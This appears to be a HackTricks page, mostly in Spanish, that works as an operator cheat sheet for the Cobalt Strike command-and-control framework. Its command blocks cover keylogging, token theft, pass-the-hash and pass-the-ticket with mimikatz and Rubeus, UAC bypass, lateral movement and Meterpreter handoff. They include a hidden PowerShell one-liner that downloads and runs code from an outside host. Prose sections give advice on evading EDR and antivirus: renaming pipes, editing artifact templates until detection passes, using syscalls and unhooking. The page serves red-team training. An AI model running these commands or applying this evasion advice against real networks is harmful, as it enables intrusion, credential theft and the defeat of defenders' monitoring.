# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.

### Peer2Peer Listeners

Los beacons de estos listeners no necesitan hablar con el C2 directamente; pueden comunicarse con él a través de otros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` luego necesitas seleccionar los beacons TCP o SMB

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para archivos HTA
* **`MS Office Macro`** para un documento de Office con una macro
* **`Windows Executable`** para un .exe, .dll o service .exe
* **`Windows Executable (S)`** para un .exe, .dll o service .exe **stageless** (mejor stageless que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/ejecutable para descargar el beacon desde Cobalt Strike en formatos como: bitsadmin, exe, powershell y python

#### Host Payloads

Si ya tienes el archivo que quieres alojar en un servidor web, simplemente ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo a alojar y la configuración del servidor web.

### Beacon Options

<details>
<summary>Opciones y comandos de Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implantes personalizados / Linux Beacons

- Un agente personalizado solo necesita hablar el protocolo HTTP/S del Team Server de Cobalt Strike (perfil malleable C2 por defecto) para registrarse/check-in y recibir tareas. Implementa las mismas URIs/headers/metadata/crypto definidos en el perfil para reutilizar la UI de Cobalt Strike para tasking y output.
- Un Aggressor Script (p. ej., `CustomBeacon.cna`) puede envolver la generación de payloads para el beacon no-Windows para que los operadores puedan seleccionar el listener y producir payloads ELF directamente desde la GUI.
- Ejemplos de handlers de tareas Linux expuestos al Team Server: `sleep`, `cd`, `pwd`, `shell` (exec comandos arbitrarios), `ls`, `upload`, `download`, y `exit`. Estos mapean a IDs de tarea esperados por el Team Server y deben implementarse del lado del servidor para devolver output en el formato apropiado.
- Soporte BOF en Linux puede añadirse cargando Beacon Object Files in-process con [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (también soporta BOFs estilo Outflank), permitiendo post-explotación modular que corra dentro del contexto/privilegios del implant sin spawnear nuevos procesos.
- Embebe un handler SOCKS en el beacon personalizado para mantener paridad de pivot con Windows Beacons: cuando el operador ejecute `socks <port>` el implant debe abrir un proxy local para enrutar las herramientas del operador a través del host Linux comprometido hacia redes internas.

## Opsec

### Execute-Assembly

El **`execute-assembly`** usa un **proceso sacrificial** mediante remote process injection para ejecutar el programa indicado. Esto es muy ruidoso porque para inyectar dentro de un proceso se usan ciertas Win APIs que todos los EDR están revisando. Sin embargo, hay algunas herramientas custom que pueden usarse para cargar algo en el mismo proceso:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- En Cobalt Strike también puedes usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

El agressor script `https://github.com/outflanknl/HelpColor` creará el comando `helpx` en Cobalt Strike que pondrá colores en los comandos indicando si son BOFs (verde), si son Frok&Run (amarillo) y similares, o si son ProcessExecution, injection o similares (rojo). Esto ayuda a saber qué comandos son más sigilosos.

### Actuar como el usuario

Puedes revisar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Revisa todos los logons interactivos para conocer el horario habitual de actividad.
- System EID 12,13 - Revisa la frecuencia de shutdown/startup/sleep.
- Security EID 4624/4625 - Revisa intentos NTLM entrantes válidos/ inválidos.
- Security EID 4648 - Este evento se crea cuando se usan credenciales en texto plano para logon. Si un proceso lo generó, el binario potencialmente tiene las credenciales en claro en un archivo de configuración o dentro del código.

Al usar `jump` desde cobalt strike, es mejor usar el método `wmi_msbuild` para hacer que el nuevo proceso parezca más legítimo.

### Usar cuentas de equipo

Es común que los defensores estén filtrando comportamientos raros generados por usuarios y **excluyan cuentas de servicio y cuentas de equipo como `*$` de su monitorización**. Puedes usar estas cuentas para movimientos laterales o escalada de privilegios.

### Usar payloads stageless

Los payloads stageless son menos ruidosos que los staged porque no necesitan descargar una segunda etapa desde el servidor C2. Eso significa que no generan tráfico de red tras la conexión inicial, haciéndolos menos propensos a ser detectados por defensas basadas en la red.

### Tokens & Token Store

Ten cuidado cuando robes o generes tokens porque puede ser posible que un EDR enumere todos los tokens de todos los threads y encuentre un **token perteneciente a otro usuario** o incluso SYSTEM en el proceso.

Esto permite almacenar tokens **por beacon** para no tener que robar el mismo token repetidamente. Esto es útil para movimiento lateral o cuando necesitas usar un token robado múltiples veces:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Al moverse lateralmente, usualmente es mejor **robar un token que generar uno nuevo** o realizar un ataque pass the hash.

### Guardrails

Cobalt Strike tiene una funcionalidad llamada **Guardrails** que ayuda a prevenir el uso de ciertos comandos o acciones que podrían ser detectadas por los defensores. Guardrails puede configurarse para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, y otros que se usan comúnmente para movimiento lateral o escalada de privilegios.

Además, el repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) también contiene algunas comprobaciones e ideas que podrías considerar antes de ejecutar un payload.

### Encriptación de tickets

En un AD ten cuidado con la encriptación de los tickets. Por defecto, algunas herramientas usarán RC4 para encriptar tickets Kerberos, que es menos seguro que AES y por defecto los entornos actualizados usarán AES. Esto puede ser detectado por defensores que monitorean algoritmos de encriptación débiles.

### Evitar valores por defecto

Cuando uses Cobalt Stricke por defecto las SMB pipes tendrán el nombre `msagent_####` y `"status_####`. Cambia esos nombres. Es posible revisar los nombres de las pipes existentes desde Cobal Strike con el comando: `ls \\.\pipe\`

Además, con sesiones SSH se crea una pipe llamada `\\.\pipe\postex_ssh_####`. Cámbiala con `set ssh_pipename "<new_name>";`.

También en ataques de poext exploitation las pipes `\\.\pipe\postex_####` pueden modificarse con `set pipename "<new_name>"`.

En los perfiles de Cobalt Strike también puedes modificar cosas como:

- Evitar usar `rwx`
- Cómo funciona el comportamiento de process injection (qué APIs se usarán) en el bloque `process-inject {...}`
- Cómo funciona el "fork and run" en el bloque `post-ex {…}`
- El tiempo de sleep
- El tamaño máximo de binarios a cargar en memoria
- La huella de memoria y el contenido de DLL con el bloque `stage {...}`
- El tráfico de red

### Bypassear el escaneo de memoria

Algunos EDRs escanean memoria buscando firmas de malware conocidas. Cobalt Strike permite modificar la función `sleep_mask` como un BOF que podrá encriptar en memoria la backdoor.

### Inyecciones de proceso ruidosas

Al inyectar código en un proceso esto suele ser muy ruidoso, esto se debe a que **ningún proceso regular suele realizar esta acción y las maneras de hacerlo son muy limitadas**. Por lo tanto, podría ser detectado por sistemas de detección basados en comportamiento. Además, también puede ser detectado por EDRs que escanean la red buscando **threads que contienen código que no está en disco** (aunque procesos como navegadores que usan JIT hacen esto comúnmente). Ejemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID y relaciones PPID

Al spawnear un nuevo proceso es importante **mantener una relación padre-hijo regular** entre procesos para evitar detección. Si svchost.exec está ejecutando iexplorer.exe se verá sospechoso, ya que svchost.exe no es padre de iexplorer.exe en un entorno Windows normal.

Cuando se spawnea un nuevo beacon en Cobalt Strike por defecto se crea un proceso usando **`rundll32.exe`** para ejecutar el nuevo listener. Esto no es muy sigiloso y puede ser fácilmente detectado por los EDRs. Además, `rundll32.exe` se ejecuta sin args haciendo que sea aún más sospechoso.

Con el siguiente comando de Cobalt Strike, puedes especificar un proceso diferente para spawnear el nuevo beacon, haciéndolo menos detectable:
```bash
spawnto x86 svchost.exe
```
También puedes cambiar esta configuración **`spawnto_x86` y `spawnto_x64`** en un perfil.

### Proxy del tráfico de los atacantes

A veces los atacantes necesitarán poder ejecutar herramientas localmente, incluso en máquinas Linux, y hacer que el tráfico de las víctimas llegue a la herramienta (p. ej., NTLM relay).

Además, a veces para realizar un pass-the.hash o pass-the-ticket es más sigiloso para el atacante **agregar este hash o ticket en su propio proceso LSASS** localmente y luego pivotar desde él en lugar de modificar el proceso LSASS de una máquina víctima.

Sin embargo, debes tener **cuidado con el tráfico generado**, ya que podrías estar enviando tráfico poco común (kerberos?) desde tu proceso de backdoor. Para esto podrías pivotar a un proceso de navegador (aunque te pueden atrapar inyectándote en un proceso, así que piensa en una forma sigilosa de hacerlo).


### Evitando AVs

#### AV/AMSI/ETW Bypass

Consulta la página:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalmente en `/opt/cobaltstrike/artifact-kit` puedes encontrar el código y las plantillas precompiladas (en `/src-common`) de los payloads que cobalt strike va a usar para generar los binary beacons.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con el backdoor generado (o solo con la plantilla compilada) puedes encontrar qué está haciendo que el defender detecte. Usualmente es una cadena. Por tanto, puedes simplemente modificar el código que genera el backdoor para que esa cadena no aparezca en el binario final.

Después de modificar el código, simplemente ejecuta `./build.sh` desde el mismo directorio y copia la carpeta `dist-pipe/` en el cliente Windows en `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicarle a Cobalt Strike que use los recursos del disco que queremos y no los que están cargados.

#### Kit de Recursos

La carpeta ResourceKit contiene las plantillas para los payloads basados en script de Cobalt Strike, incluyendo PowerShell, VBA y HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas puedes identificar qué es lo que al defensor (AMSI en este caso) no le gusta y modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando las líneas detectadas se puede generar una plantilla que no será detectada.

No olvides cargar el script aggressive `ResourceKit\resources.cna` para indicar a Cobalt Strike que use los recursos desde disco que queremos y no los ya cargados.

#### Function hooks | Syscall

Function hooking es un método muy común de los ERDs para detectar actividad maliciosa. Cobalt Strike te permite eludir estos hooks usando **syscalls** en lugar de las llamadas estándar a la Windows API mediante la configuración **`None`**, o usar la versión `Nt*` de una función con el ajuste **`Direct`**, o simplemente saltar sobre la función `Nt*` con la opción **`Indirect`** en el malleable profile. Dependiendo del sistema, una opción puede ser más sigilosa que otra.

Esto se puede configurar en el profile o usando el comando **`syscall-method`**

Sin embargo, esto también puede ser ruidoso.

Una opción que proporciona Cobalt Strike para eludir los function hooks es eliminar esos hooks con: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

También puedes comprobar qué funciones están hooked con [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) o [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandos varios de Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referencias

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 análisis del cifrado de metadatos de Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diario sobre el tráfico de Cobalt Strike](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
